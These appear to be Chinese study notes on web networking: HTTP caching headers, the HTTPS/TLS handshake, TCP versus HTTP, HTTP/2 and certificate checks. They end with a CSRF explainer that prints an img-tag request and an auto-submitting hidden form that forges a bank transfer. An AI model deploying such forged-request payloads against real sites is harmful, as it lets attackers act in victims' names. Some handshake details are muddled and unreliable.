## 协商缓存

服务器通过判断请求的 header 判断请求资源是否可以缓存访问。

具体过程：

1. 客户端第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在 respone 的 header 加上 Last-Modified 的字段，这个字段表示这个资源在服务器上的最后修改时间；
2. 客户端再次跟服务器请求这个资源时，在 request 的 header 上加上 If-Modified-Since 的字段，这个字段的值就是上一次请求时返回的 Last-Modified 的值；
3. 服务器再次收到资源请求时，根据请求头的 If-Modified-Since 字段和资源最后修改时间判断资源是否有变化。如果没有变化则返回304 Not Modified，不会返回资源内容；有变化，则正常返回资源内容。当服务器返回304 Not Modified的响应时，response header 中不会再添加 Last-Modified 字段，因为既然资源没有变化，那么 Last-Modified 也就不会改变；
4. 客户端收到 304 的 response 后，就会从缓存中加载资源
5. 如果协商缓存没有命中，浏览器直接从服务器加载资源时，Last-Modified 字段在重新加载的时候会被更新，下次请求时，If-Modified-Since 会启用最近一次返回的 Last-Modified 值

Last-Modified / If-Modified-Since 都是GMT格式的时间字符串

也可以通过请求头中的 Etag / If-None-Match 字段实现。Etag 跟 Last-Modified 的区别主要在 Etag 是由服务器生成的每个资源的唯一标识字符串。解决了一些文件会周期性的更改，但是他的内容并不改变所导致发生无谓的更换缓存。

## https 是什么？工作**原理？**

https可以理解为http+TLS

## 工作原理

1. **客户端发起HTTPS 请求**

   SSL连接总是由客户端启动，在SSL会话开始时，执行SSL握手。用户在浏览器里输入一个https网址，实际会连接到服务器的443端口。

   客户端发送如下信息：

   - 客户端密支持的加密方式列表（以客户端首选项顺序排序），如 SSL 的版本、客户端支持的加密算法和客户端支持的数据压缩方法(Hash 算法)。
   - 28字节的随机数，client_random

2. **服务端的配置**

   采用https协议的服务器必须有一套数字证书，这套证书有一套公钥和私钥

3. **传送证书**

   服务器返回：

   - 服务器端选出的加密算法和压缩算法
   - 服务器生成的随机数server_random
   - SSL证书（服务器使用带有 SSL 的 X.509 V3 数字证书）这个证书包含网站地址，公钥 public_key ，证书的颁发机构，过期时间等等。

4. **客户端解析证书**

   由客户端的TLS完成

   1. 首先验证证书是否有效
   2. 根据 server_random 生成一个随机值 premaster_secret （master_secret 的生成需要 premaster_key ，并需要 client_random 和 server_random 作为种子）
   3. 然后用公钥对该随机数进行加密

5. **传送加密信息**

   客户端发送公钥 public_key 加密的 premaster secret

6. **服务端解密信息**

   服务端用私钥 private_key 将公钥加密premaster secret的解密后得到master secret，

7. **传输加密后的信息**

   将被 master secret对称加密的信息返回客户端，客户端可还原

8. **客户端解密信息**

   客户端用之前生成的premaster_secret 解密服务段传过来的信息，于是获取了解密后的内容.

## tcp和http的区别

- tcp连接

  手机能使用联网功能是因为手机底层实现了tcp/ip协议，可以建立TCP连接。TCP协议对上层网络提供接口，建立一个tcp协议需要 ”3次握手“，而断开tcp连接需要”四次挥手“

- HTTP连接

  HTTP协议即超文本传送协议(Hypertext Transfer Protocol )，是Web联网的基础，也是手机联网常用的协议之一，HTTP协议是建立在TCP协议之上的一种应用。

  HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接，从建立连接到关闭连接的过程称为‘1次连接’

  1. 在HTTP 1.0中，客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。
  2. 在HTTP 1.1中则可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。

  由于HTTP在每次请求结束后都会主动释放连接，因此HTTP连接是一种“短连接”，要保持客户端在线的状态就需要每隔一段时间发送一次保持连接的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”，若服务器长时间无法收到客户端的请求，则认为客户端下线，若客户端长时间没有收到回复，则认为网络断开

- 相互关系

  TCP就是单纯建立连接，不涉及任何我们需要请求的实际数据，简单的传输。http是用来收发数据，即实际应用上来的。先建立tcp连接，然后发送数据的时候再发送http连接。

  TCP是底层通讯协议，定义的是数据传输和连接方式的规范
  ​      HTTP是应用层协议，定义的是传输数据的内容的规范
  ​      HTTP协议中的数据是利用TCP协议传输的，所以支持HTTP也就一定支持TCP 

  ```

  ```

  ## http的一次请求

  1. 建立tcp连接

     在http工作开始之前需要建立tcp连接，web浏览器首先要通过网络与web服务器建立，该连接就是通过tcp来完成。就是协议与tcp协议共同构建Internet。HTTP是比TCP更高层次的应用层协议，根据规则，只有低层协议建立之 后才能，才能进行更层协议的连接，因此，首先要建立TCP连接，一般TCP连接的端口号是80。

  2. web浏览器想web服务器发送请求指令

     一旦建立了tcp连接，web浏览器就会向web服务器发送请求命令

  3. web浏览器发送请求头信息

     浏览器发送其请求命令之后，还要以头信息的形式向Web服务器发送一些别的信息，之后浏览器发送了一空白行来通知服务器，它已经结束了该头信息的发送。

  4. Web服务器应答

     客户机向服务器发出请求后，服务器会客户机回送应答， HTTP/1.1 200 OK ，应答的第一部分是协议的版本号和应答状态码。

  5. Web服务器发送应答头信息

     正如客户端会随同请求发送关于自身的信息一样，服务器也会随同应答向用户发送关于它自己的数据及被请求的文档。

  6. Web服务器向浏览器发送数据

     Web服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据。

  7. Web服务器关闭TCP连接

## http2

主要区别

1. 用二进制格式而不是文本格式

   二进制协议解析起来更高效、“线上”更紧凑，更重要的是错误更少。

2. 完全多路复用，而非有序阻塞，只需要一个连接即可实现并行

   HTTP/1.x 有个问题叫线端阻塞(head-of-line blocking), 它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1 试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求). 此外, 由于网络媒介(intermediary )和服务器不能很好的支持流水线, 导致部署起来困难重重。而多路传输(Multiplexing)能很好的解决这些问题, 因为它能同时处理多个消息的请求和响应; 甚至可以在传输过程中将一个消息跟另外一个掺杂在一起。所以客户端只需要一个连接就能加载一个页面。

3. 使用抱头压缩，降低开销

4. 服务器可以将响应主动推送到客户端缓存中

   当浏览器请求一个网页时，服务器将会发回HTML，在服务器开始发送JavaScript、图片和CSS前，服务器需要等待浏览器解析HTML和发送所有内嵌资源的请求。服务器推送服务通过“推送”那些它认为客户端将会需要的内容到客户端的缓存中，以此来避免往返的延迟。

### 如何判断HTTPS的安全性

为了解决解决HTTPS的安全性问题主要是以下几个方面

1. 使用数字证书进行验证身份

   在https发送请求的时候，服务器会发送自身的数字证书给浏览器，浏览器对数字证书（证书包含颁发机构，有效期、签名等有效信息）进行验证，验证的方式是使用CA提供的公钥对签名解密，，验证元信息是否一致，就可以判断当前证书是否合法。

   签名是指利用上一层证书的私钥，加密一些元信息（证书所有者的信息，包括基本信息，公钥，证书生效域名等）。**每个证书会对下一层的证书合法性做担保** 

   **根证书是一种自签名证书**。在浏览器或者操作系统中，会预安装一些证书，这些证书就是根证书，对于这些证书，在证书验证的过程中会直接选择相信。因此不要轻易安装其他网站的证书。

   为防止黑客篡改公钥等信息，使用数字证书的方式来传输公钥，数字证书包含了明文的web服务器URL，非对称加密算法的公钥等信息，最后还对这些信息进行hash计算，然后用证书机构的私钥加密该hash值和使用的hash算法。浏览器使用证书的公钥进行解密，然后按照hash算法本地计算内容hash值和证书的hash值对比，若一致，那说明证书内容没有被修改。同时确保浏览器访问的URL和证书的URL一致，若也一致，那就可以继续访问。

2. 在数据传输过程中利用公钥和私钥的获取使用了非对称性加密，而数据的加密解密用了对称性加密


# CSRF攻击

csrf：攻击者盗用你的身份，进行发送恶意请求

CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！

**原理 **

![image](https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg)





必须经历两个步骤：

1. 受害者需要登录信任网站A，并获得cookie
2. 在不登出A的情况下，访问危险网站B

其实就是B中用html内嵌了一个对A的请求，当用户访问B网站的时候，就会向A发送带cookie的请求

**实例** ：

假设网站A的一个请求为：http://www.mybank.com/Transfer.php?toBankId=11&money=1000

那在网站B中可以在html中使用一个img标签

```html
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>	
```

这样子在访问网站B的时候，就会发起对网站A的一个请求，就好比CDN一样。

如果在网站A中是用post请求，那么在网站B里使用form表单即可

```html
<html>
　　<head>
　　　　<script type="text/javascript">
　　　　　　function steal()
　　　　　　{
          　　　　 iframe = document.frames["steal"];
　　     　　      iframe.document.Submit("transfer");
　　　　　　}
　　　　</script>
　　</head>

　　<body onload="steal()">
　　　　<iframe name="steal" display="none">
　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
　　　　　　　　<input type="hidden" name="toBankId" value="11">
　　　　　　　　<input type="hidden" name="money" value="1000">
　　　　　　</form>
　　　　</iframe>
　　</body>
</html>
```

